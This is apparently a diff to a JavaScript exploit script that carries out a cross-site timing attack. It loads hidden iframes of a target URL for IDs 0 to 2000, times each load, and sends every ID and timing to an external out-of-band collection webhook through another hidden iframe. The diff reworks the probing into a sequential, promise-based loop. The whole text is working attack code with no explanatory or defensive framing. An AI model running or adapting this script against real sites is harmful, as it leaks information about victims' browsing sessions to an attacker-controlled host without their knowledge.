@@ -5,35 +5,46 @@ const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 let i = 0;
 const MAX = 2000;
 
-const iframe = document.createElement("iframe");
-iframe.style.display = "none";
-document.documentElement.appendChild(iframe);
-
-const ex = document.createElement("iframe");
-ex.style.display = "none";
-document.documentElement.appendChild(ex);
-
 function probe(id) {
-    const start = performance.now();
+    return new Promise(resolve => {
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
 
-    iframe.onload = () => {
-        const delta = performance.now() - start;
+        const start = performance.now();
 
-        console.log("ID:", id, "TIME:", delta);
+        let done = false;
 
-        ex.src = WEBHOOK + "?id=" + id + "&t=" + delta;
-    };
+        iframe.onload = () => {
+            if (done) return;
+            done = true;
 
-    iframe.src = TARGET + id;
+            const delta = performance.now() - start;
+
+            console.log("ID:", id, "TIME:", delta);
+
+            const ex = document.createElement("iframe");
+            ex.src = WEBHOOK + "?id=" + id + "&t=" + delta;
+            ex.style.display = "none";
+            document.body.appendChild(ex);
+
+            if (iframe.parentNode) {
+                iframe.parentNode.removeChild(iframe);
+            }
+
+            resolve();
+        };
+
+        iframe.src = TARGET + id;
+        document.body.appendChild(iframe);
+    });
 }
 
-function loop() {
-    if (i > MAX) return;
+async function loop() {
+    for (let id = 0; id <= MAX; id++) {
+        await probe(id);
 
-    probe(i);
-    i++;
-
-    setTimeout(loop, 1000);
+        await new Promise(r => setTimeout(r, 200));
+    }
 }
 
 loop();
